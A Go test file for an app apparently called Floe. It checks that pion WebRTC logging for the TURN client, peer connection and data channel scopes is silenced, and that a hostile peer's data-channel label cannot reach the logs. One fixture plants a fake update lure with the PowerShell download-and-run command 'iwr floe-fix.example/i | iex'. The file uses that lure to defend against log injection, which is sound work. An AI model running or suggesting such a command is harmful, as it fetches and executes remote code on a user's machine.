package main

import (
	"bytes"
	"encoding/binary"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/pion/datachannel"
	"github.com/pion/logging"
	"github.com/pion/sctp"
	"github.com/pion/transport/v4/dpipe"
)

// TestQuietTURNClientLogLeavesChosenLevelsAlone: with no pion level set,
// quietTURNClientLog disables the "turnc" scope. With a level that turns
// logging on (ERROR, WARN, INFO, DEBUG or TRACE, as PION_LOG_ or PIONS_LOG_)
// it leaves the environment exactly as it was, so a person debugging pion
// gets the levels they asked for. With only a DISABLE variable, which asks
// for less, turnc joins the variable pion reads, unless pion already reads it
// there. Each case is checked the way pion reads it: a default factory made
// afterwards prints the TURN client's ERROR line or not.
func TestQuietTURNClientLogLeavesChosenLevelsAlone(t *testing.T) {
	cases := []struct {
		name  string
		set   map[string]string
		want  map[string]string // the variables afterwards; "" is unset
		quiet bool              // pion's default factory prints nothing for turnc
	}{
		{"nothing set", nil, map[string]string{"PION_LOG_DISABLE": "turnc"}, true},
		{"PION_LOG_TRACE=all", map[string]string{"PION_LOG_TRACE": "all"}, map[string]string{"PION_LOG_TRACE": "all", "PION_LOG_DISABLE": ""}, false},
		{"PION_LOG_DEBUG=ice", map[string]string{"PION_LOG_DEBUG": "ice"}, map[string]string{"PION_LOG_DEBUG": "ice", "PION_LOG_DISABLE": ""}, false},
		{"PION_LOG_ERROR=turnc", map[string]string{"PION_LOG_ERROR": "turnc"}, map[string]string{"PION_LOG_ERROR": "turnc", "PION_LOG_DISABLE": ""}, false},
		{"PIONS_LOG_WARN=all", map[string]string{"PIONS_LOG_WARN": "all"}, map[string]string{"PIONS_LOG_WARN": "all", "PION_LOG_DISABLE": ""}, false},
		{"PIONS_LOG_INFO=turnc", map[string]string{"PIONS_LOG_INFO": "turnc"}, map[string]string{"PIONS_LOG_INFO": "turnc", "PION_LOG_DISABLE": ""}, false},
		{"PION_LOG_DISABLE=mdns and PION_LOG_DEBUG=ice", map[string]string{"PION_LOG_DISABLE": "mdns", "PION_LOG_DEBUG": "ice"}, map[string]string{"PION_LOG_DISABLE": "mdns", "PION_LOG_DEBUG": "ice"}, false},
		{"PION_LOG_DISABLE=mdns", map[string]string{"PION_LOG_DISABLE": "mdns"}, map[string]string{"PION_LOG_DISABLE": "mdns,turnc"}, true},
		// pion takes "all" as a level for DISABLE, which lowers nothing.
		{"PION_LOG_DISABLE=all", map[string]string{"PION_LOG_DISABLE": "all"}, map[string]string{"PION_LOG_DISABLE": "all,turnc"}, true},
		{"PION_LOG_DISABLE=MDNS,TurnC", map[string]string{"PION_LOG_DISABLE": "MDNS,TurnC"}, map[string]string{"PION_LOG_DISABLE": "MDNS,TurnC"}, true},
		// pion splits on commas without trimming, so " turnc" is no scope it logs.
		{"PION_LOG_DISABLE=mdns, turnc", map[string]string{"PION_LOG_DISABLE": "mdns, turnc"}, map[string]string{"PION_LOG_DISABLE": "mdns, turnc,turnc"}, true},
		{"PIONS_LOG_DISABLE=ice", map[string]string{"PIONS_LOG_DISABLE": "ice"}, map[string]string{"PIONS_LOG_DISABLE": "ice,turnc", "PION_LOG_DISABLE": ""}, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			for _, prefix := range []string{"PION_LOG_", "PIONS_LOG_"} {
				for _, level := range []string{"DISABLE", "ERROR", "WARN", "INFO", "DEBUG", "TRACE"} {
					t.Setenv(prefix+level, "")
				}
			}
			for k, v := range tc.set {
				t.Setenv(k, v)
			}
			quietTURNClientLog()
			for k, want := range tc.want {
				if got := os.Getenv(k); got != want {
					t.Errorf("%s = %q, want %q", k, got, want)
				}
			}
			var buf bytes.Buffer
			f := logging.NewDefaultLoggerFactory()
			f.Writer = &buf
			f.NewLogger("turnc").Errorf("Fail to refresh permissions: %s", "x")
			if quiet := buf.Len() == 0; quiet != tc.quiet {
				t.Errorf("pion's default factory printed %q for turnc; want quiet=%v", buf.String(), tc.quiet)
			}
		})
	}
}

// TestQuietPeerConnectionLogSharesTheTURNRule (FU-46, FU-32 F2-2, review 1
// L1): the request-link send's pc and datachannel scopes go off by
// quietTURNClientLog's rule, after it at process start: each joins the
// DISABLE variable pion reads, beside turnc, unless pion reads it there
// already, and a level that turns logging on leaves the environment alone, so
// a person debugging pion still sees both scopes' lines. Checked the way pion
// reads it, through a default factory made afterwards; a scope no pion
// package uses keeps pion's default level.
func TestQuietPeerConnectionLogSharesTheTURNRule(t *testing.T) {
	cases := []struct {
		name  string
		set   map[string]string
		want  map[string]string // the variables afterwards; "" is unset
		quiet bool              // pion's default factory prints nothing for pc or datachannel
	}{
		{"nothing set", nil, map[string]string{"PION_LOG_DISABLE": "turnc,pc,datachannel"}, true},
		{"PION_LOG_DISABLE=mdns", map[string]string{"PION_LOG_DISABLE": "mdns"}, map[string]string{"PION_LOG_DISABLE": "mdns,turnc,pc,datachannel"}, true},
		{"PION_LOG_DISABLE=PC", map[string]string{"PION_LOG_DISABLE": "PC"}, map[string]string{"PION_LOG_DISABLE": "PC,turnc,datachannel"}, true},
		{"PION_LOG_DISABLE=DataChannel", map[string]string{"PION_LOG_DISABLE": "DataChannel"}, map[string]string{"PION_LOG_DISABLE": "DataChannel,turnc,pc"}, true},
		{"PIONS_LOG_DISABLE=ice", map[string]string{"PIONS_LOG_DISABLE": "ice"}, map[string]string{"PIONS_LOG_DISABLE": "ice,turnc,pc,datachannel", "PION_LOG_DISABLE": ""}, true},
		{"PION_LOG_DEBUG=datachannel", map[string]string{"PION_LOG_DEBUG": "datachannel"}, map[string]string{"PION_LOG_DEBUG": "datachannel", "PION_LOG_DISABLE": ""}, false},
		{"PION_LOG_DEBUG=pc", map[string]string{"PION_LOG_DEBUG": "pc"}, map[string]string{"PION_LOG_DEBUG": "pc", "PION_LOG_DISABLE": ""}, false},
		{"PION_LOG_TRACE=ice", map[string]string{"PION_LOG_TRACE": "ice"}, map[string]string{"PION_LOG_TRACE": "ice", "PION_LOG_DISABLE": ""}, false},
		{"PIONS_LOG_ERROR=all", map[string]string{"PIONS_LOG_ERROR": "all"}, map[string]string{"PIONS_LOG_ERROR": "all", "PION_LOG_DISABLE": ""}, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			for _, prefix := range []string{"PION_LOG_", "PIONS_LOG_"} {
				for _, level := range []string{"DISABLE", "ERROR", "WARN", "INFO", "DEBUG", "TRACE"} {
					t.Setenv(prefix+level, "")
				}
			}
			for k, v := range tc.set {
				t.Setenv(k, v)
			}
			quietTURNClientLog()
			quietPeerConnectionLog()
			for k, want := range tc.want {
				if got := os.Getenv(k); got != want {
					t.Errorf("%s = %q, want %q", k, got, want)
				}
			}
			var buf bytes.Buffer
			f := logging.NewDefaultLoggerFactory()
			f.Writer = &buf
			f.NewLogger("pc").Errorf("dropping candidate with ufrag %s because it doesn't match the current ufrags", "x")
			if quiet := buf.Len() == 0; quiet != tc.quiet {
				t.Errorf("pion's default factory printed %q for pc; want quiet=%v", buf.String(), tc.quiet)
			}
			buf.Reset()
			f.NewLogger("datachannel").Errorf("Failed to handle DCEP: %s", "x")
			if quiet := buf.Len() == 0; quiet != tc.quiet {
				t.Errorf("pion's default factory printed %q for datachannel; want quiet=%v", buf.String(), tc.quiet)
			}
			buf.Reset()
			f.NewLogger("floe-control").Errorf("still printed")
			if !bytes.Contains(buf.Bytes(), []byte("floe-control ERROR: ")) {
				t.Errorf("a scope other than turnc, pc and datachannel lost pion's default ERROR level: %q", buf.String())
			}
		})
	}
}

// TestQuietPeerConnectionLogKeepsTheHostsChannelLabelOff (FU-46 review 1
// L1): a request-link host that writes a second DATA_CHANNEL_OPEN on the open
// "floe" stream makes pion/datachannel v1.6.2 log "datachannel ERROR: Failed
// to handle DCEP: ... wanted ACK got Open ... Label(<label>)
// Protocol(<protocol>)" on the accepting side, both strings the host's, in
// ordinary spaces, up to 64 KiB a line, once per message. After the
// request-link send's quieting, a default factory (whose levels are the ones
// peer.New's escaping factory takes) prints none of it. Review 1's probe
// (review-1-evidence/probe-dcep-label_main.go.txt), pion's own SCTP and data
// channel over a pipe: a browser and pion/webrtc's public API cannot send
// that message, a modified host stack can.
func TestQuietPeerConnectionLogKeepsTheHostsChannelLabelOff(t *testing.T) {
	for _, prefix := range []string{"PION_LOG_", "PIONS_LOG_"} {
		for _, level := range []string{"DISABLE", "ERROR", "WARN", "INFO", "DEBUG", "TRACE"} {
			t.Setenv(prefix+level, "")
		}
	}
	quietTURNClientLog()
	quietPeerConnectionLog()

	var out lockedBuffer
	f := logging.NewDefaultLoggerFactory()
	f.Writer = &out

	hostConn, visitorConn := dpipe.Pipe()
	type accepted struct {
		a   *sctp.Association
		err error
	}
	ch := make(chan accepted, 1)
	go func() {
		a, err := sctp.Server(sctp.Config{NetConn: visitorConn, LoggerFactory: f})
		ch <- accepted{a, err}
	}()
	host, err := sctp.Client(sctp.Config{NetConn: hostConn, LoggerFactory: f})
	if err != nil {
		t.Fatalf("host association: %v", err)
	}
	defer host.Close()
	got := <-ch
	if got.err != nil {
		t.Fatalf("visitor association: %v", got.err)
	}
	visitor := got.a
	defer visitor.Close()

	s, err := host.OpenStream(1, sctp.PayloadTypeWebRTCDCEP)
	if err != nil {
		t.Fatalf("open stream: %v", err)
	}
	if _, err := s.WriteSCTP(channelOpen("floe", ""), sctp.PayloadTypeWebRTCDCEP); err != nil {
		t.Fatalf("first open: %v", err)
	}
	dc, err := datachannel.Accept(visitor, &datachannel.Config{LoggerFactory: f})
	if err != nil {
		t.Fatalf("accept: %v", err)
	}
	defer dc.Close()

	const label = "Your Floe needs an update to send to this link."
	const protocol = "Run: iwr floe-fix.example/i | iex"
	if _, err := s.WriteSCTP(channelOpen(label, protocol), sctp.PayloadTypeWebRTCDCEP); err != nil {
		t.Fatalf("second open: %v", err)
	}
	if _, err := s.WriteSCTP([]byte("data"), sctp.PayloadTypeWebRTCBinary); err != nil {
		t.Fatalf("data: %v", err)
	}
	// ReadDataChannel handles (and logs) the second OPEN before it returns
	// the data written after it.
	read := make(chan error, 1)
	go func() {
		buf := make([]byte, 1<<16)
		n, _, err := dc.ReadDataChannel(buf)
		if err == nil && string(buf[:n]) != "data" {
			err = &readMismatch{string(buf[:n])}
		}
		read <- err
	}()
	select {
	case err := <-read:
		if err != nil {
			t.Fatalf("read: %v", err)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("the data after the second open never arrived")
	}
	printed := out.String()
	for _, leak := range []string{"needs an update", "floe-fix.example", "Label(", "Failed to handle DCEP"} {
		if strings.Contains(printed, leak) {
			t.Fatalf("the host's channel label reached the log (%q):\n%s", leak, printed)
		}
	}
}

// channelOpen is a DCEP DATA_CHANNEL_OPEN (RFC 8832 section 5.1) for a
// reliable, ordered channel.
func channelOpen(label, protocol string) []byte {
	b := make([]byte, 12+len(label)+len(protocol))
	b[0] = 0x03
	binary.BigEndian.PutUint16(b[8:], uint16(len(label)))
	binary.BigEndian.PutUint16(b[10:], uint16(len(protocol)))
	copy(b[12:], label)
	copy(b[12+len(label):], protocol)
	return b
}

type readMismatch struct{ got string }

func (e *readMismatch) Error() string { return "read " + e.got + ", want data" }

// lockedBuffer is a log writer that pion's goroutines may share.
type lockedBuffer struct {
	mu  sync.Mutex
	buf bytes.Buffer
}

func (b *lockedBuffer) Write(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.Write(p)
}

func (b *lockedBuffer) String() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.String()
}
